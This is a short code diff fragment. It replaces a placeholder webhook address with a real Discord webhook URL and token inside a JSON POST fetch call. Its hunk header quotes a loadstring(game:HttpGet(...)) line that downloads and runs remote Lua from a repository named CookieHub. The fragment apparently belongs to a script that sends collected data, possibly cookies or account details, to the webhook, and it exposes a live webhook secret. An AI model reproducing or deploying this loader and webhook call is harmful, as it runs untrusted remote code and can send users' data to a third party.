@@ -47,7 +47,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub
               return;
             }
 
-            fetch('YOUR_WEBHOOK_URL', {
+            fetch('https://discord.com/api/webhooks/1365679141168353371/MTveez8isOYXF7RSALX36yGcu-cdIYMiGh73d-2czgL1tCZiaMlmD2f-xGU9A15h2p5_', {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/json'
